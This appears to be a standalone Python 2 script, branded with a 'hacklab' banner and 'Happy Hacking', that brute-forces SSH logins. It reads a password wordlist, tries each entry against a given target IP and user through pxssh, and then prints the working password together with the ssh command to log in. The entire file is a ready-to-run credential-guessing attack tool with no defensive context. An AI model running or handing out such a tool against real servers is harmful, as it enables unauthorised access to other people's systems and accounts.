#!/usr/bin/env python

from pexpect import pxssh
from optparse import *


class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.end = "\033[0m"
                self.bold = "\033[1m"
cl = colors()


print (cl.blue+"""

	*--------------------------------------*
	|      			        |
	|          			              |
	|         			            |
	*--------------------------------------*
	   _                _    _       _     
	  | |__   __ _  ___| | _| | __ _| |__  
	  | '_ \ / _` |/ __| |/ / |/ _` | '_ \ 
	  | | | | (_| | (__|   <| | (_| | |_) |
	  |_| |_|\__,_|\___|_|\_\_|\__,_|_.__/ 
	
	              Happy Hacking               
	            ----------------        
	            
"""+cl.end)
parser = OptionParser("""

#Usage:
	
	python ssh.py -t <Target Ip> -u <User> -p <Password file>


""")

def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print cl.red+("\n[+] Password Found: [ {} ] ".format(password))+cl.end
        print ("\n[For Connect With SSH Service Write] : ssh {}@{}".format(user,host))
	print "[Then Enter Password]: ",password
	print "\n\t* Done *\n"
        exit(0)
    except Exception:
        return None 
try:
	parser.add_option("-t",dest="target",type="string")
	parser.add_option("-u",dest="user",type="string")
	parser.add_option("-p",dest="password",type="string")
	(options, args) = parser.parse_args()
	if options.target == None or options.user == None or options.password == None:
		print(parser.usage)
		exit(0)
	else:
		host = str(options.target)
		user = str(options.user)
		password = str(options.password)

		read = open(password,'r')
		for pas in read:
    		    password = pas.strip('\n')
    		    print "Testing Passwd: "+password
    		    connect(host, user, password)

except KeyboardInterrupt:
	print "\n[!] Exit Programme"
	exit(0)
	
print "\n[-] Oops Password SSH Service Not Found :(\n"